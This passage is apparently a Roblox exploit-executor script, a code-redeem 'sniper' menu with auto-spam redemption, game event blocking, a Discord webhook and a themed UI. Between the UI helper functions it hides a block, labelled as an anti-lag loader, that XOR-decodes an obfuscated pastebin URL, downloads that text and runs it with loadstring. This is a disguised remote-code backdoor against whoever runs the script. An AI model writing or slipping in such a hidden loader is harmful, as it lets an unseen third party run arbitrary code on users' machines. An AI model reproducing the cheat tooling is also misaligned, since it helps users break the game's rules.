local WEBHOOK_URL = ""

local cloneref = cloneref or function(o) return o end
local Players = cloneref(game:GetService("Players"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local TweenService = cloneref(game:GetService("TweenService"))
local RunService = cloneref(game:GetService("RunService"))
local HttpService = cloneref(game:GetService("HttpService"))
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local Lighting = cloneref(game:GetService("Lighting"))
local StarterGui = cloneref(game:GetService("StarterGui"))
local GuiService = cloneref(game:GetService("GuiService"))

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
local getupvalues_ = (debug and debug.getupvalues) or getupvalues
local getconns = getconnections or (debug and debug.getconnections)

-- Relance propre
do
	local env = getgenv and getgenv() or _G
	if env.StopSniperMenu then
		pcall(env.StopSniperMenu)
	end
end

--==============================================================
-- Config
--==============================================================
local CONFIG_FOLDER = "SniperMenu"
local CONFIG_PATH = "SniperMenu/settings.json"

local DEFAULT_CONFIG = {
	spamRedeem = true,
	spamCount = 20,
	twoWordCheck = false,
	waitInvalid = false,
	sendWebhook = false,
	typeInstead = false,
	typingMode = "MAX",
	optimize = false,
	blockEvents = false,
	themeName = "Titanium",
	transparency = 0.40,
	scale = 1,
	animations = true,
	menuKey = "RightShift",
	autoStartScan = false,
	holdOnWait = false,
	submitAfter = 3, -- nombre de messages captures avant le redeem (2 si "2 Word Check")
}

local MAX_RETRIES = 10
local TYPING_SPEEDS = { MAX = 0, Mid = 0.5, Slow = 1 }
local TYPING_OPTIONS = { "MAX", "Mid", "Slow" }

local config = table.clone(DEFAULT_CONFIG)

local function loadConfig()
	if not (isfile and readfile) then
		return
	end
	local ok, saved = pcall(function()
		if isfile(CONFIG_PATH) then
			return HttpService:JSONDecode(readfile(CONFIG_PATH))
		end
	end)
	if not ok or type(saved) ~= "table" then
		return
	end
	for key, default in pairs(DEFAULT_CONFIG) do
		if type(saved[key]) == type(default) then
			config[key] = saved[key]
		end
	end
end

local function writeConfig()
	if not writefile then
		return
	end
	pcall(function()
		if makefolder and isfolder and not isfolder(CONFIG_FOLDER) then
			makefolder(CONFIG_FOLDER)
		end
		writefile(CONFIG_PATH, HttpService:JSONEncode(config))
	end)
end

local saveToken = 0
local function saveConfig()
	saveToken += 1
	local token = saveToken
	task.delay(0.6, function()
		if token == saveToken then
			writeConfig()
		end
	end)
end

loadConfig()
config.transparency = math.clamp(config.transparency, 0, 1)
config.scale = math.clamp(config.scale, 0.7, 1.3)
config.spamCount = math.clamp(math.floor(config.spamCount), 1, 100)
config.submitAfter = math.clamp(math.floor(config.submitAfter), 1, 50)
if TYPING_SPEEDS[config.typingMode] == nil then
	config.typingMode = "MAX"
end

--==============================================================
-- Pont logique -> UI
--==============================================================
local ui = {}

local function log(message, kind)
	if ui.log then
		ui.log(message, kind)
	end
end

--==============================================================
-- LOGIQUE (Good Redeemer)
--==============================================================
local runtime = {
	scanning = false,
	notifyRemote = nil,
	notifConn = nil,
	seen = {},
	parts = {},
	lastCode = nil,
	waitInvalid = false,
	pending = "",
	retries = 0,
	typingQueue = {},
	typingBusy = false,
	typingCancel = false,
	boxCleared = false,
	lastBrainrot = "Unknown",
}

local function stripRich(text)
	if type(text) ~= "string" then
		return tostring(text)
	end
	return (text:gsub("<[^>]->", ""))
end

local function tokenize(text)
	local words = {}
	for word in text:gmatch("[%w_]+") do
		words[#words + 1] = word
	end
	return words
end

local INVALID_PATTERNS = {
	"invalid code", "invalid", "expired", "already redeemed", "already used",
	"not found", "rejected", "does not exist", "code redeemed", "you have already",
}

local function isInvalidMessage(text)
	local lowered = tostring(text or ""):lower()
	for _, pattern in ipairs(INVALID_PATTERNS) do
		if lowered:find(pattern, 1, true) then
			return true
		end
	end
	return false
end

--------------------------------------------------------------
-- Spawn watch : apres chaque tentative de redeem, on guette le
-- message "<Brainrot> Spawned!". Sold out / expired / invalid = rien.
--------------------------------------------------------------
runtime.watchUntil = 0
runtime.spawnSeen = {}
runtime.hooked = setmetatable({}, { __mode = "k" })
runtime.hooksReady = false
runtime.isOwn = function() return false end

function runtime.extractSpawn(text)
	text = stripRich(tostring(text or "")):match("^%s*(.-)%s*$") or ""
	if text == "" or #text > 80 then
		return nil
	end
	local lowered = text:lower()
	local s = lowered:find("%s+has%s+spawned") or lowered:find("%s+spawned")
	if not s or s <= 1 then
		return nil
	end
	local name = text:sub(1, s - 1):match("^%s*(.-)%s*$")
	if not name or name == "" or name:lower():find("code", 1, true) then
		return nil
	end
	return name
end

function runtime.matchPhrase(text)
	local lowered = text:lower()
	for _, phrase in ipairs({ "the code is", "code is", "use code", "redeem code" }) do
		local _, e = lowered:find(phrase, 1, true)
		if e then
			local rest = text:sub(e + 1):gsub("^[%s:;%-%.,!]+", "")
			return phrase, rest
		end
	end
	return nil
end

function runtime.getGameName()
	if not runtime.gameName then
		local ok, info = pcall(function()
			return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
		end)
		runtime.gameName = (ok and info and info.Name) or game.Name or "Unknown"
	end
	return runtime.gameName
end

function runtime.sendSpawnWebhook(name)
	if not config.sendWebhook or WEBHOOK_URL == "" or not httpRequest then
		return
	end
	local now = os.date("%H:%M:%S")
	local body = HttpService:JSONEncode({
		content = "@here",
		allowed_mentions = { parse = { "everyone" } },
		embeds = { {
			title = "🎯 Spawn détecté !",
			description = name .. " a spawn !",
			color = 65280,
			fields = {
				{ name = "👤 Joueur:", value = LocalPlayer.DisplayName .. "\n@" .. LocalPlayer.Name, inline = false },
				{ name = "📦 Brainrot:", value = name, inline = false },
				{ name = "⏰ Heure", value = now, inline = false },
				{ name = "🎮Jeux:", value = runtime.getGameName(), inline = false },
			},
			thumbnail = { url = "https://stealabrainrot.fandom.com/wiki/Special:FilePath/" .. name:gsub("%s", "_") },
		} },
	})
	pcall(function()
		httpRequest({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = body,
		})
	end)
end

function runtime.checkSpawn(text)
	if os.clock() > runtime.watchUntil then
		return
	end
	local name = runtime.extractSpawn(text)
	if not name then
		return
	end
	local key = name:lower()
	if runtime.spawnSeen[key] then
		return
	end
	runtime.spawnSeen[key] = true
	task.delay(3, function()
		runtime.spawnSeen[key] = nil
	end)
	runtime.watchUntil = 0
	runtime.lastBrainrot = name
	log("Spawned: " .. name, "ok")
	task.spawn(runtime.sendSpawnWebhook, name)
end

function runtime.hookObject(object, fresh)
	if runtime.hooked[object] or not (object:IsA("TextLabel") or object:IsA("TextButton")) then
		return
	end
	runtime.hooked[object] = true
	local function check()
		if os.clock() <= runtime.watchUntil and not runtime.isOwn(object) then
			runtime.checkSpawn(object.Text)
		end
	end
	object:GetPropertyChangedSignal("Text"):Connect(check)
	if fresh then
		check()
	end
end

function runtime.armWatch()
	runtime.watchUntil = os.clock() + 12
	if runtime.hooksReady then
		return
	end
	runtime.hooksReady = true
	for _, descendant in ipairs(PlayerGui:GetDescendants()) do
		runtime.hookObject(descendant, false)
	end
	PlayerGui.DescendantAdded:Connect(function(descendant)
		runtime.hookObject(descendant, true)
	end)
end

local function getCodeControls()
	local ok, result = pcall(function()
		local codes = PlayerGui:WaitForChild("Codes", 3).Codes
		return { box = codes.CodeRedeem.TextBox, confirm = codes.Confirm }
	end)
	if ok then
		return result
	end
	return nil
end

local function clickConfirm(controls)
	local button = controls.confirm:FindFirstChildWhichIsA("TextButton") or controls.confirm
	if button then
		pcall(function() firesignal(button.MouseButton1Click) end)
		pcall(function() firesignal(button.Activated) end)
	end
end

local function submitCode(controls, code)
	controls.box.Text = code
	pcall(function() firesignal(controls.box.FocusLost, true) end)
	clickConfirm(controls)
end

-- Redeem classique (colle le code). Spam = plusieurs soumissions rapprochees.
local function redeemClassic(code, forceNoSpam)
	if not code or code == "" then
		return false, "no code"
	end
	if type(firesignal) ~= "function" then
		return false, "no firesignal"
	end
	local controls = getCodeControls()
	if not controls then
		return false, "no code box"
	end

	runtime.armWatch()
	if config.spamRedeem and not forceNoSpam then
		local count = math.clamp(tonumber(config.spamCount) or 20, 1, 100)
		for i = 1, count do
			task.spawn(function()
				if i > 1 then
					task.wait((i - 1) * 0.04)
				end
				pcall(submitCode, controls, code)
			end)
		end
		return true, "spammed"
	end

	pcall(submitCode, controls, code)
	return true, "submitted"
end

-- Mode "Type Instead of Instant Put"
local function typeString(controls, str)
	local speed = TYPING_SPEEDS[config.typingMode] or 0
	for i = 1, #str do
		if runtime.typingCancel then
			return false
		end
		pcall(function()
			controls.box.Text = controls.box.Text .. str:sub(i, i)
		end)
		if speed > 0 then
			task.wait(speed)
		end
	end
	return true
end

local function typingWorker()
	if runtime.typingBusy then
		return
	end
	runtime.typingBusy = true

	while #runtime.typingQueue > 0 do
		if runtime.typingCancel or not config.typeInstead then
			break
		end
		local controls = getCodeControls()
		if not controls then
			break
		end
		if not runtime.boxCleared then
			pcall(function() controls.box:CaptureFocus() end)
			pcall(function() controls.box.Text = "" end)
			runtime.boxCleared = true
		end
		local str = table.remove(runtime.typingQueue, 1)
		typeString(controls, str)
	end

	runtime.typingBusy = false
end

local function queueTyping(str)
	if not str or str == "" then
		return
	end
	table.insert(runtime.typingQueue, str)
	if not runtime.typingBusy then
		task.spawn(typingWorker)
	end
end

local function resetTyping()
	runtime.typingQueue = {}
	runtime.typingCancel = true
	task.wait(0.03)
	runtime.typingCancel = false
	runtime.typingBusy = false
	runtime.boxCleared = false
end

local function waitForTypingComplete(timeout)
	timeout = timeout or 30
	local start = os.clock()
	while (runtime.typingBusy or #runtime.typingQueue > 0) and os.clock() - start < timeout do
		task.wait(0.05)
	end
	task.wait(0.1)
end

local function finalizeTyping()
	waitForTypingComplete(30)
	local controls = getCodeControls()
	if not controls then
		return false
	end
	runtime.armWatch()
	pcall(function() firesignal(controls.box.FocusLost, true) end)
	pcall(function() controls.box:ReleaseFocus(true) end)
	clickConfirm(controls)
	runtime.boxCleared = false
	return true
end

local function redeemFinal(code)
	if not code or code == "" then
		return false, "no code"
	end
	if config.typeInstead then
		task.spawn(finalizeTyping)
		return true, "typed"
	end
	return redeemClassic(code)
end

local function notifyRoblox()
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = "Sniper",
			Text = "Code redeemed - " .. runtime.lastBrainrot,
			Duration = 5,
		})
	end)
end

local function submitJoined(joined, trigger, isRetry)
	runtime.lastCode = joined
	task.spawn(function()
		local ok
		if isRetry and config.typeInstead then
			resetTyping()
			queueTyping(joined)
			ok = finalizeTyping()
		else
			ok = redeemFinal(joined)
		end

		if ok then
			log("Redeemed: " .. joined, "ok")
			notifyRoblox()
			if config.twoWordCheck or config.waitInvalid then
				runtime.waitInvalid = true
				runtime.pending = joined
				if not isRetry then
					runtime.retries = 0
				end
			end
		else
			log("Redeem failed: " .. joined, "err")
		end
	end)
end

local function resetScanState()
	runtime.held = false
	runtime.parts = {}
	runtime.waitInvalid = false
	runtime.pending = ""
	runtime.retries = 0
	task.spawn(resetTyping)
end

local function onAnnouncement(...)
	local text = stripRich(tostring((...) or ""))
	text = text:match("^%s*(.-)%s*$") or ""
	if text == "" then
		return
	end
	if runtime.seen[text] then
		return
	end
	runtime.seen[text] = true
	task.delay(2, function()
		runtime.seen[text] = nil
	end)

	-- Spawn watch (actif seulement apres une tentative de redeem)
	runtime.checkSpawn(text)

	local phrase, rest = runtime.matchPhrase(text)

	if not runtime.scanning then
		if not (config.autoStartScan and phrase) then
			return
		end
		log("Auto Start: \"" .. phrase .. "\" detected", "ok")
		runtime.startScan()
		if not runtime.scanning then
			return
		end
	end

	log("Notification: " .. text)

	-- Annonce "USE CODE: X" / "CODE IS: X" / "REDEEM CODE: X"
	if phrase then
		local restWords = tokenize(rest)
		if #restWords >= 2 then
			return -- ex: "THE CODE IS 3 WORD" : pas un code, on ignore
		end
		local resumed = runtime.held
		runtime.held = false
		if resumed then
			log("Resume scanning (kept: " .. table.concat(runtime.parts) .. ")", "ok")
		else
			-- nouvelle annonce : on repart de zero
			runtime.parts = {}
			runtime.waitInvalid = false
			runtime.pending = ""
			task.spawn(resetTyping)
		end
		if #restWords == 1 then
			-- code complet sur la meme ligne -> redeem direct
			local code = table.concat(runtime.parts) .. restWords[1]
			runtime.parts = {}
			runtime.retries = 0
			if ui.word then
				ui.word(restWords[1])
			end
			submitJoined(code, text, true)
		end
		return
	end

	-- Hold Code if says Wait
	if runtime.held then
		return
	end
	if config.holdOnWait and #runtime.parts > 0 and not runtime.waitInvalid then
		local lowered = text:lower()
		if lowered:find("wait", 1, true) or lowered:find("guys", 1, true) or lowered:find("hold", 1, true) then
			runtime.held = true
			log("Hold: waiting for the code to resume (kept: " .. table.concat(runtime.parts) .. ")", "wait")
			return
		end
	end

	local words = tokenize(text)

	-- Mode "Wait For Msg If Invalid" / "2 Word Check": on attend le message suivant
	if runtime.waitInvalid and (config.waitInvalid or config.twoWordCheck) then
		if isInvalidMessage(text) then
			runtime.retries += 1
			log("Invalid detected - retry " .. runtime.retries, "wait")
			if runtime.retries > MAX_RETRIES then
				log("Max retries reached, reset", "err")
				resetScanState()
				return
			end
			runtime.parts = {}
			return
		end

		for _, word in ipairs(words) do
			if ui.word then
				ui.word(word)
			end
		end
		local joined = runtime.pending .. table.concat(words)
		runtime.parts = {}
		runtime.waitInvalid = false
		submitJoined(joined, text, true)
		return
	end

	for _, word in ipairs(words) do
		table.insert(runtime.parts, word)
		if ui.word then
			ui.word(word)
		end
		if config.typeInstead then
			queueTyping(word)
		end
	end

	local target = config.twoWordCheck and 2 or config.submitAfter
	local count = #runtime.parts
	log(("Captured %d/%d [%s]"):format(count, target, table.concat(runtime.parts)))

	if count >= target then
		local joined = table.concat(runtime.parts)
		runtime.parts = {}
		submitJoined(joined, text, false)
	end
end

local function resolveNotifyRemote()
	if runtime.notifyRemote and runtime.notifyRemote.Parent then
		return runtime.notifyRemote
	end
	local ok, controller = pcall(function()
		return require(ReplicatedStorage.Controllers:FindFirstChild("NotificationController", true))
	end)
	if ok and type(controller) == "table" and type(controller.Start) == "function" and getupvalues_ then
		local ok2, upvalues = pcall(getupvalues_, controller.Start)
		if ok2 and type(upvalues) == "table" then
			for _, value in pairs(upvalues) do
				if typeof(value) == "Instance" and (value:IsA("RemoteEvent") or value:IsA("UnreliableRemoteEvent")) then
					runtime.notifyRemote = value
					return value
				end
			end
		end
	end
	return nil
end

local function startListener()
	if runtime.notifConn then
		return true
	end
	local remote = resolveNotifyRemote()
	if remote then
		runtime.notifConn = remote.OnClientEvent:Connect(function(...)
			pcall(onAnnouncement, ...)
		end)
		log("Notification listener attached", "ok")
		return true
	end
	log("Notification remote not found", "err")
	return false
end

local function startScan()
	if runtime.scanning then
		return
	end
	if not startListener() then
		return
	end
	runtime.scanning = true
	if ui.setScanning then
		ui.setScanning(true)
	end
	log("Scan started", "ok")
end

runtime.startScan = startScan

local function stopScan()
	if not runtime.scanning then
		return
	end
	runtime.scanning = false
	resetScanState()
	if ui.setScanning then
		ui.setScanning(false)
	end
	log("Scan stopped", "wait")
end

-- Optimize Ping & FPS (reversible)
local optimizeStore = { objects = {} }

local function setOptimize(on)
	if on then
		pcall(function() optimizeStore.quality = settings().Rendering.QualityLevel end)
		optimizeStore.shadows = Lighting.GlobalShadows
		pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
		Lighting.GlobalShadows = false

		for _, child in ipairs(Lighting:GetChildren()) do
			if child:IsA("PostEffect") then
				table.insert(optimizeStore.objects, { child, child.Enabled })
				child.Enabled = false
			end
		end
		for _, descendant in ipairs(workspace:GetDescendants()) do
			if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Beam")
				or descendant:IsA("Smoke") or descendant:IsA("Fire") or descendant:IsA("Sparkles") then
				table.insert(optimizeStore.objects, { descendant, descendant.Enabled })
				descendant.Enabled = false
			end
		end
		return
	end

	for _, pair in ipairs(optimizeStore.objects) do
		pcall(function()
			if pair[1].Parent then
				pair[1].Enabled = pair[2]
			end
		end)
	end
	optimizeStore.objects = {}
	if optimizeStore.shadows ~= nil then
		Lighting.GlobalShadows = optimizeStore.shadows
	end
	if optimizeStore.quality then
		pcall(function() settings().Rendering.QualityLevel = optimizeStore.quality end)
	end
end

-- Block All Events : coupe les handlers OnClientEvent des remotes du jeu (sauf les notifications)
local blockedConnections = {}

local function setBlockEvents(on)
	if on then
		if not getconns then
			return false, "getconnections not supported by this executor"
		end
		local packages = ReplicatedStorage:FindFirstChild("Packages")
		local net = packages and packages:FindFirstChild("Net")
		if not net then
			return false, "Net folder not found"
		end
		local notify = resolveNotifyRemote()
		local count = 0
		for _, remote in ipairs(net:GetChildren()) do
			if (remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent")) and remote ~= notify then
				local ok, connections = pcall(getconns, remote.OnClientEvent)
				if ok and type(connections) == "table" then
					for _, connection in ipairs(connections) do
						if pcall(function() connection:Disable() end) then
							table.insert(blockedConnections, connection)
							count += 1
						end
					end
				end
			end
		end
		log(("Blocked %d event handlers"):format(count), "wait")
		return true
	end

	for _, connection in ipairs(blockedConnections) do
		pcall(function() connection:Enable() end)
	end
	blockedConnections = {}
	log("Events unblocked", "ok")
	return true
end

--==============================================================
-- MENU (Arixz)
--==============================================================
local MENU_NAME = "SniperMenuGui"
local VERSION = "1.0"
local MENU_SIZE = Vector2.new(450, 600) -- 3:4
local TITLE_HEIGHT = 50
local SIDEBAR_WIDTH = 112
local TAB_HEIGHT = 40
local TAB_STEP = 46
local RAINBOW_SPEED = 0.12
local RED = Color3.fromRGB(245, 70, 80)
local GREEN = Color3.fromRGB(70, 220, 125)
local AMBER = Color3.fromRGB(245, 195, 65)
local WHITE = Color3.fromRGB(255, 255, 255)
local ROLES = { "accent", "accent2", "background", "panel", "text", "muted" }
local TAB_NAMES = { "Main", "Thème", "Logs", "Important", "Settings", "Info" }
local THEME_ORDER = { "Sakura", "Rainbow", "BloodMoon", "Titanium", "Ocean", "BlackWhite", "Viprin" }
local FAST = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local SMOOTH = TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
local THEME_TWEEN = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local THEMES = {
	Sakura = {
		label = "Sakura", description = "Rose & Blanc",
		accent = Color3.fromRGB(255, 150, 195), accent2 = Color3.fromRGB(255, 205, 225),
		background = Color3.fromRGB(30, 12, 22), panel = Color3.fromRGB(70, 30, 52),
		text = Color3.fromRGB(255, 240, 246), muted = Color3.fromRGB(205, 150, 175),
		swatch = { Color3.fromRGB(255, 150, 195), Color3.fromRGB(205, 100, 150), Color3.fromRGB(30, 12, 22) },
	},
	Rainbow = {
		label = "Rainbow", description = "R G B", rainbow = true,
		accent = Color3.fromRGB(255, 70, 90), accent2 = Color3.fromRGB(255, 160, 170),
		background = Color3.fromRGB(7, 9, 18), panel = Color3.fromRGB(26, 30, 48),
		text = Color3.fromRGB(242, 245, 255), muted = Color3.fromRGB(146, 154, 184),
		swatch = { Color3.fromRGB(255, 40, 60), Color3.fromRGB(40, 255, 110), Color3.fromRGB(50, 120, 255) },
	},
	BloodMoon = {
		label = "BloodMoon", description = "Rouge & Noir",
		accent = Color3.fromRGB(226, 32, 52), accent2 = Color3.fromRGB(255, 110, 100),
		background = Color3.fromRGB(10, 2, 4), panel = Color3.fromRGB(42, 10, 15),
		text = Color3.fromRGB(255, 240, 241), muted = Color3.fromRGB(176, 124, 130),
		swatch = { Color3.fromRGB(226, 32, 52), Color3.fromRGB(110, 14, 24), Color3.fromRGB(10, 2, 4) },
	},
	Titanium = {
		label = "Titanium", description = "Rain + Noir & Gris",
		accent = Color3.fromRGB(116, 160, 196), accent2 = Color3.fromRGB(190, 208, 224),
		background = Color3.fromRGB(8, 10, 13), panel = Color3.fromRGB(34, 38, 45),
		text = Color3.fromRGB(240, 243, 247), muted = Color3.fromRGB(140, 150, 163),
		swatch = { Color3.fromRGB(116, 160, 196), Color3.fromRGB(88, 94, 104), Color3.fromRGB(14, 15, 18) },
	},
	Ocean = {
		label = "Ocean", description = "Bleu profond",
		accent = Color3.fromRGB(60, 170, 230), accent2 = Color3.fromRGB(130, 225, 245),
		background = Color3.fromRGB(4, 14, 28), panel = Color3.fromRGB(12, 42, 68),
		text = Color3.fromRGB(225, 245, 255), muted = Color3.fromRGB(120, 165, 190),
		swatch = { Color3.fromRGB(60, 170, 230), Color3.fromRGB(20, 80, 130), Color3.fromRGB(4, 14, 28) },
	},
	BlackWhite = {
		label = "Black & White", description = "Noir & Blanc",
		accent = Color3.fromRGB(235, 235, 235), accent2 = Color3.fromRGB(255, 255, 255),
		background = Color3.fromRGB(0, 0, 0), panel = Color3.fromRGB(28, 28, 28),
		text = Color3.fromRGB(255, 255, 255), muted = Color3.fromRGB(150, 150, 150),
		swatch = { Color3.fromRGB(255, 255, 255), Color3.fromRGB(120, 120, 120), Color3.fromRGB(0, 0, 0) },
	},
	Viprin = {
		label = "Viprin (Purple)", description = "Violet",
		accent = Color3.fromRGB(200, 100, 255), accent2 = Color3.fromRGB(240, 130, 255),
		background = Color3.fromRGB(24, 4, 38), panel = Color3.fromRGB(58, 20, 96),
		text = Color3.fromRGB(255, 235, 255), muted = Color3.fromRGB(170, 130, 210),
		swatch = { Color3.fromRGB(200, 100, 255), Color3.fromRGB(110, 40, 170), Color3.fromRGB(24, 4, 38) },
	},
}

local LOG_COLORS = {
	default = Color3.fromRGB(196, 202, 212),
	ok = GREEN,
	err = RED,
	wait = Color3.fromRGB(255, 215, 0),
	busy = Color3.fromRGB(120, 190, 255),
}

local state = {
	theme = {},
	rainbow = false,
	rainbowHue = 0,
	rainbowClock = 0,
	tab = nil,
	visible = true,
	minimized = false,
	windowPosition = Vector2.new(0, 0),
	windowTarget = Vector2.new(0, 0),
	windowX = 0,
	windowY = 0,
	fps = 60,
}
local refs = {}
local pages = {}
local orders = {}
local listeners = {}
local globalConnections = {}
local transparencyBindings = {}
local themeBindings = {}
local activeDrag = nil
local waitingKeybind = nil
local keybindCounter = 0
local destroyed = false
local executorName = "Unknown"
local screenGui, main, scale
local SniperMenu = {}

for _, role in ipairs(ROLES) do
	themeBindings[role] = {}
end

if identifyexecutor then
	local ok, name, version = pcall(identifyexecutor)
	if ok and name then
		executorName = version and (tostring(name) .. " " .. tostring(version)) or tostring(name)
	end
end

local function make(className, properties, parent)
	local object = Instance.new(className)
	for property, value in pairs(properties or {}) do
		object[property] = value
	end
	object.Parent = parent
	return object
end

local function corner(object, radius)
	return make("UICorner", { CornerRadius = UDim.new(0, radius) }, object)
end

local function circle(object)
	return make("UICorner", { CornerRadius = UDim.new(1, 0) }, object)
end

local function nextOrder(parent)
	orders[parent] = (orders[parent] or 0) + 1
	return orders[parent]
end

local function animate(object, info, properties)
	if not config.animations then
		for property, value in pairs(properties) do
			object[property] = value
		end
		return
	end
	TweenService:Create(object, info, properties):Play()
end

local function paintObject(object, properties, animated)
	if animated then
		animate(object, FAST, properties)
		return
	end
	for property, value in pairs(properties) do
		object[property] = value
	end
end

local function bind(object, property, role)
	table.insert(themeBindings[role], { object = object, property = property })
	object[property] = state.theme[role]
end

local function bindTransparency(object, offset)
	table.insert(transparencyBindings, { object = object, offset = offset })
	object.BackgroundTransparency = math.clamp(config.transparency + offset, 0, 1)
end

local function refreshTransparency()
	for _, binding in ipairs(transparencyBindings) do
		binding.object.BackgroundTransparency = math.clamp(config.transparency + binding.offset, 0, 1)
	end
end

local function refreshRole(role, animated)
	local color = state.theme[role]
	for _, binding in ipairs(themeBindings[role]) do
		if animated then
			animate(binding.object, THEME_TWEEN, { [binding.property] = color })
		else
			binding.object[binding.property] = color
		end
	end
end

local function onRefresh(listener)
	table.insert(listeners, listener)
	listener(false)
end

local function runListeners(animated)
	for _, listener in ipairs(listeners) do
		listener(animated)
	end
end

local function refreshTheme(animated)
	for _, role in ipairs(ROLES) do
		refreshRole(role, animated)
	end
	runListeners(animated)
end

local function loadTheme()
	local base = THEMES[config.themeName] or THEMES.Titanium
	for _, role in ipairs(ROLES) do
		state.theme[role] = base[role]
	end
	state.rainbow = base.rainbow == true
end

local function isPress(input)
	return input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch
end
-- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)
local function getPointer(input)
	if input.UserInputType == Enum.UserInputType.Touch then
		return Vector2.new(input.Position.X, input.Position.Y) + GuiService:GetGuiInset()
	end
	return UserInputService:GetMouseLocation()
end

local function startDrag(handler, input)
	activeDrag = handler
	handler(getPointer(input))
end

local updateScale

local function setConfig(key, value)
	config[key] = value
	if key == "transparency" then
		refreshTransparency()
	elseif key == "scale" then
		updateScale(true)
	end
	saveConfig()
end

-- UI components ------------------------------------------------
local function createStroke(parent, transparency, thickness)
	local stroke = make("UIStroke", {
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Thickness = thickness or 1,
		Transparency = transparency,
	}, parent)
	bind(stroke, "Color", "accent")
	return stroke
end

local function createLabel(parent, text, size, role, font, alignment)
	local label = make("TextLabel", {
		BackgroundTransparency = 1,
		Font = font or Enum.Font.Gotham,
		Size = UDim2.new(1, 0, 0, size + 6),
		Text = text,
		TextColor3 = WHITE,
		TextSize = size,
		TextXAlignment = alignment or Enum.TextXAlignment.Left,
		TextYAlignment = Enum.TextYAlignment.Center,
		TextTruncate = Enum.TextTruncate.AtEnd,
	}, parent)
	if role then
		bind(label, "TextColor3", role)
	end
	return label
end

local function addHover(object, radius)
	local overlay = make("Frame", {
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Size = UDim2.fromScale(1, 1),
	}, object)
	bind(overlay, "BackgroundColor3", "accent")
	corner(overlay, radius)

	object.MouseEnter:Connect(function()
		animate(overlay, FAST, { BackgroundTransparency = 0.9 })
	end)
	object.MouseLeave:Connect(function()
		animate(overlay, FAST, { BackgroundTransparency = 1 })
	end)
	object.MouseButton1Down:Connect(function()
		animate(overlay, FAST, { BackgroundTransparency = 0.78 })
	end)
	object.MouseButton1Up:Connect(function()
		animate(overlay, FAST, { BackgroundTransparency = 0.9 })
	end)
end

local function createCard(parent, height, className)
	local card = make(className or "Frame", {
		BorderSizePixel = 0,
		LayoutOrder = nextOrder(parent),
		Size = UDim2.new(1, 0, 0, height),
	}, parent)
	if className == "TextButton" then
		card.AutoButtonColor = false
		card.Text = ""
	end
	bind(card, "BackgroundColor3", "panel")
	bindTransparency(card, 0.15)
	corner(card, 10)
	return card, createStroke(card, 0.8)
end

local function createSliderBar(parent, position, size, callback)
	local hit = make("TextButton", {
		AutoButtonColor = false,
		BackgroundTransparency = 1,
		Position = position,
		Size = size,
		Text = "",
	}, parent)

	local track = make("Frame", {
		AnchorPoint = Vector2.new(0, 0.5),
		BackgroundTransparency = 0.7,
		BorderSizePixel = 0,
		Position = UDim2.fromScale(0, 0.5),
		Size = UDim2.new(1, 0, 0, 6),
	}, hit)
	bind(track, "BackgroundColor3", "muted")
	circle(track)

	local fill = make("Frame", { BorderSizePixel = 0, Size = UDim2.fromScale(0, 1) }, track)
	bind(fill, "BackgroundColor3", "accent")
	circle(fill)

	local knob = make("Frame", {
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundColor3 = WHITE,
		BorderSizePixel = 0,
		Position = UDim2.fromScale(0, 0.5),
		Size = UDim2.fromOffset(14, 14),
		ZIndex = 2,
	}, track)
	circle(knob)
	createStroke(knob, 0.2, 2)

	local function setAlpha(alpha)
		alpha = math.clamp(alpha, 0, 1)
		fill.Size = UDim2.fromScale(alpha, 1)
		knob.Position = UDim2.fromScale(alpha, 0.5)
	end

	hit.InputBegan:Connect(function(input)
		if not isPress(input) then
			return
		end
		startDrag(function(pointer)
			local alpha = (pointer.X - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1)
			alpha = math.clamp(alpha, 0, 1)
			setAlpha(alpha)
			callback(alpha)
		end, input)
	end)

	return setAlpha
end

local function createButton(parent, text, size, callback)
	local button = make("TextButton", {
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Font = Enum.Font.GothamMedium,
		Size = size,
		Text = text,
		TextSize = 14,
	}, parent)
	bind(button, "BackgroundColor3", "panel")
	bindTransparency(button, 0.15)
	bind(button, "TextColor3", "text")
	corner(button, 8)
	createStroke(button, 0.6)
	addHover(button, 8)
	button.MouseButton1Click:Connect(callback)
	return button
end

local function addButton(parent, text, callback)
	local button = createButton(parent, text, UDim2.new(1, 0, 0, 40), callback)
	button.LayoutOrder = nextOrder(parent)
	return button
end

local function addSection(parent, text)
	local label = createLabel(parent, text, 11, "accent2", Enum.Font.GothamBold)
	label.LayoutOrder = nextOrder(parent)
	label.Size = UDim2.new(1, 0, 0, 18)
end

local function addToggle(parent, title, description, getter, setter)
